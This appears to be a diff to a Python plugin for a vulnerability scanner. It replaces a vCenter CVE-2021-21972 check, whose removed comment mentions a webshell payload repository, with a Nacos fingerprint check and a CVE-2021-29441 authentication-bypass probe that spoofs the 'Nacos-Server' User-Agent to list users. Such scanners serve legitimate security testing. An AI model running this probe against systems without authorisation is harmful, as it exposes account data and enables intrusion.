@@ -5,6 +5,8 @@ import re
 import hashlib
 from tqdm import *
 from colorama import Fore
+from queue import Queue
+from urllib.parse import urlparse
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -17,14 +19,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # 模板
 class Detect(threading.Thread):
-    '''
-    CVE-2021-21972 vCenter 6.5-7.0 RCE 漏洞为任意文件上传
-    存在问题的接口为/ui/vropspluginui/rest/services/uploadova，完整路径（https://domain.com/ui/vropspluginui/rest/services/uploadova）
-    仓库内的payload文件夹内的tar文件为默认冰蝎3 webshell
-    https://github.com/NS-Sp4ce/CVE-2021-21972
-    '''
-
-    name = 'CVE-2021-21972'
+    name = 'Nacos'
 
     def __init__(self, alive_Web_queue, pbar, vul_list, requests_proxies):
         threading.Thread.__init__(self)
@@ -44,30 +39,54 @@ class Detect(threading.Thread):
 
     # 调用各种漏洞检测方法
     def run_detect(self, url):
-        # 检测
-        self.check(url)
+        nacos_urls = []
+        nacos_urls.append(url + '/nacos')
+
+        scheme = urlparse(url).scheme
+        ip_domain = urlparse(url).netloc.split(':')[0]
+        nacos_urls.append(f"{scheme}://{ip_domain}:8848/nacos")
+
+        for nacos_url in list(set(nacos_urls)):
+            # 检测
+            if self.check(nacos_url):
+                self.CVE_2021_29441(nacos_url)
 
     def check(self, url):
-        upload_url = url + '/ui/vropspluginui/rest/services/uploadova'
         try:
-            res = requests.get(url=upload_url, headers=self.headers, proxies=self.proxies, timeout=20, verify=False, allow_redirects=False)
-            status_code = res.status_code
-            if status_code == 405:
-                tqdm.write(Fore.RED + '[{}] {}'.format('vCenter', url))
-                self.vul_list.append(['vCenter', url, 'Yes'])
+            res = requests.get(url=url, headers=self.headers, proxies=self.proxies, timeout=20, verify=False)
+            if 'console-fe/public/img/favicon.ico' in res.text or 'console-ui/public/img/nacos-logo.png' in res.text:
+                tqdm.write(Fore.RED + '[{}] {}'.format('Nacos', url))
+                self.vul_list.append(['Nacos', url, 'Yes'])
                 return True
             else:
                 return False
         except Exception as e:
             return False
 
+    def CVE_2021_29441(self, url):
+        try:
+            res = requests.get(url=url, headers=self.headers, proxies=self.proxies, timeout=20, verify=False)
+            redirect_url = res.url
+            attack_url = redirect_url.rstrip('/') + '/v1/auth/users?pageNo=1&pageSize=9'
+            headers = {'User-Agent': 'Nacos-Server'}
+            res = requests.get(url=attack_url, headers=headers, proxies=self.proxies, timeout=20, verify=False)
+            if 'pageItems' in res.text:
+                tqdm.write(Fore.RED + '[{} CVE-2021-29441] {}'.format('Nacos', url))
+                self.vul_list.append(['Nacos', url, 'Yes CVE-2021-29441'])
+            else:
+                pass
+        except Exception as e:
+            return False
+
+
 if __name__ == '__main__':
     from queue import Queue
 
-    alive_web = ['']
+    alive_web = []
     vul_list = []
     # proxy = r''
     # requests_proxies = {"http": "socks5://{}".format(proxy), "https": "socks5://{}".format(proxy)}
+    # requests_proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}
     requests_proxies = None
     alive_Web_queue = Queue(-1)  # 将存活的web存入队列里
     for _ in alive_web:
